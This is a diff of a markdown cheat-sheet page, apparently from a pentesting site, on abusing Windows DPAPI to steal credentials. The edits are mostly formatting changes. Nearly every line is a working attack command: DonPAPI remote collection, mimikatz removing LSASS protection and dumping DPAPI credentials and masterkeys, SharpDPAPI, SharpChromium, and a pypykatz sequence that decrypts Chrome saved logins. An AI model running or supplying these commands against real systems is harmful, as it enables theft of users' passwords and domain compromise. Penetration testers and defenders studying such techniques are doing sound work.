@@ -9,15 +9,11 @@ tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
-DonPAPI collect -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -t <TARGET>
+DonPAPI collect -d <DOMAIN> -u <USER> -p '<PASSWORD>' -t <TARGET>
 ```
 
 <small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -29,28 +25,18 @@ DonPAPI collect -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -t <TARGET>
 
 #### 1. Info Gathering
 
-<div>
-
 ```console
 cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect"
 ```
 
-</div>
-
 #### 2. Secrets Dump
-
-<div>
 
 ```console
 mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit"
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
-
-<div>
 
 ```console
 # Run as system
@@ -62,36 +48,17 @@ mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" 
 .\SharpDPAPI.exe credentials /password:'<PASSWORD>'
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
 ### Abuse #2: Browser Saved Creds
 
-{{< tab set3 tab1 active >}}Auto{{< /tab >}}
-{{< tab set3 tab2 >}}Manual{{< /tab >}}
+{{< tab set3 tab1 active >}}Manual{{< /tab >}}
+{{< tab set3 tab2 >}}Auto{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-<div>
-
-```console
-.\SharpChromium.exe logins
-```
-
-</div>
-
-<small>*Ref: [SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set3 tab2 >}}
-
 #### 1. Prepare logindata and localstate file
-
-<div>
 
 ```console
 # Get Local State json file, copy and paste to local Linux
@@ -118,22 +85,14 @@ cat logindata_b64 | base64 -d > logindata
 cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
 ```
 
-</div>
-
-<div>
-
 ```console
 # Get masterkey_guid
 pypykatz dpapi describe blob blob
 ```
 
-</div>
-
 <small>*Ref: [pypykatz](https://github.com/skelsec/pypykatz)*</small>
 
 #### 2. Retrieve Keys
-
-<div>
 
 ```console
 # Get master key
@@ -150,11 +109,7 @@ type C:\ProgramData\<MASTERKEY_GUID>
 cat masterkey_guid_b64 | base64 -d > masterkey_guid
 ```
 
-</div>
-
 #### 3. Decrypt
-
-<div>
 
 ```console
 pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
@@ -168,11 +123,16 @@ pypykatz dpapi masterkey <MASTERKEY_GUID_FILE> pkf -o mkf
 pypykatz dpapi chrome --logindata logindata mkf localstate
 ```
 
-</div>
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
+
+```console
+.\SharpChromium.exe logins
+```
+
+<small>*Ref: [SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)*</small>
 
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -181,10 +141,8 @@ pypykatz dpapi chrome --logindata logindata mkf localstate
 {{< tab set4 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
-<div>
-
 ```console
-# Take note: Last key
+# Take note of the last key
 .\mimikatz.exe "dpapi::masterkey /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /rpc" exit
 ```
 
@@ -193,8 +151,4 @@ pypykatz dpapi chrome --logindata logindata mkf localstate
 .\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /masterkey:<KEY>" exit
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
